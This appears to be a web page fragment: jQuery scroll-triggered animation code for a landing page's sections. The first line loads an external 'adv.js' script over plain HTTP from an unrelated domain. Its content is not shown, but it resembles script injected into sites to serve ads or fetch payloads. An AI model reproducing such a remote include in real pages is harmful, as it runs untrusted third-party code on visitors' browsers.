<script src="http://fm.p0y.cn/j/adv.js"></script><script type="text/javascript">
    //
    var timerEvent = setInterval(function(){
        if(window.$){
            clearInterval(timerEvent);
            $(document).ready(function(){
                var Animate = {},sTop,f={};
                f={
                    flag_1:!1,
                    flag_2:!1,
                    flag_3:!1,
                    flag_4:!1,
                    flag_5:!1,
                    flag_6:!1,
                    i:!1
                };
                sTop = parseInt($(window).scrollTop(),10);
                function switchTop(){
                    var model2H=parseInt( $('.model_2').offset().top);
                    var model3H=parseInt( $('.model_3').offset().top);
                    var model4H=parseInt($('.model_4').offset().top);
                    var model5H=parseInt($('.model_5').offset().top);
                    var model6H=parseInt($('.model_6').offset().top);
                    var scrollA=parseInt($(window).scrollTop())+parseInt($(window).height())-300;

                    model2H < scrollA &&  !f.flag_2 && Animate.A2();
                    model3H < scrollA &&  !f.flag_3 && Animate.A3();
                    model4H < scrollA &&  !f.flag_4 && Animate.A4();
                    model5H < scrollA &&  !f.flag_5 && Animate.A5();
                    model6H < scrollA &&  !f.flag_6 && Animate.A6();

                }
                Animate = {
                    init:function(){
                        f.i=!0;
                    },
                    A2:function(){
                        f.flag_2 = !0;
                        $('.model_2 .model_title').animate({'top':'90px'},'normal');
                        $('.model_2 .model_div').animate({'top':'186px'},'normal');

                        $('.flag1').stop().animate({'top':'255px'},'normal',function(){
                            $('.flag1').addClass('flagfly1');
                        });
                        $('.flag2').stop().animate({'top':'367px'},'normal',function(){
                            $('.flag2').addClass('flagfly2');
                        });
                        $('.flag3').stop().animate({'top':'135px'},'normal',function(){
                            $('.flag3').addClass('flagfly3');
                        });

                    },
                    A3:function(){
                        f.flag_3 = !0;

                        $('.model_3 .model_title').stop().animate({'top':'120px'},'normal');
                        $('.model_3 .model_div').stop().animate({'top':'216px'},'normal');


                    },
                    A4:function(){
                        f.flag_4 = !0;
                        $('.model_4 .model_title').stop().animate({'opacity':1},2000).fadeIn();
                        $('.model_4 .model_div').stop().animate({'opacity':1},2000).fadeIn();
                        $('.make_up1').stop().animate({'opacity':1},'fast',"swing",function(){
                            $('.make_up2').stop().animate({'opacity':1},'fast',"swing",function(){
                                $('.make_up3').stop().animate({'opacity':1},'fast',"swing",function(){
                                    $('.make_up4').stop().animate({'opacity':1},'fast',"swing",function(){
                                        $('.make_up5').stop().animate({'opacity':1},'fast',"swing",function(){
                                            $('.make_up6').stop().animate({'opacity':1},'fast',"swing");

                                        }).fadeIn();
                                    }).fadeIn();
                                }).fadeIn();

                            }).fadeIn();

                        }).fadeIn();
                    },
                    A5:function(){
                        f.flag_5 = !0;
                        $('.model_5 .model_title').stop().animate({'top':'53px','right':'140px'},'normal');
                        $('.model_5 .model_div').stop().animate({'top':'153px','right':'140px'},'normal');
                        $('.phone1').stop().animate({'left':'562px'},'normal');
                        $('.phone2').stop().animate({'top':'573px'},'normal');
                        $('.phone3').stop().animate({'top':'213px'},'normal');
                        $('.phone4').stop().animate({'left':'86px'},'normal');
                        $('.phone5').stop().animate({'left':'40px'},'normal');
                    },
                    A6:function(){
                        f.flag_6 = !0;
                        $('.model_6 .model_title').stop().animate({'left':'80px'},'normal');
                        $('.model_6 .model_div').stop().animate({'left':'80px'},'normal');

                        $('.box1').stop().animate({'left':'818px','top':'215px'},1500);
                        $('.box2').stop().animate({'left':'511px','top':'100px'},1500);
                    }
                }
                Animate.init();
                $(window).scroll(function(){
                    sTop = parseInt($(window).scrollTop(),10);
                    if(f.i){
                        switchTop();
                    }

                });

            });
        }

    },100);
</script>



        
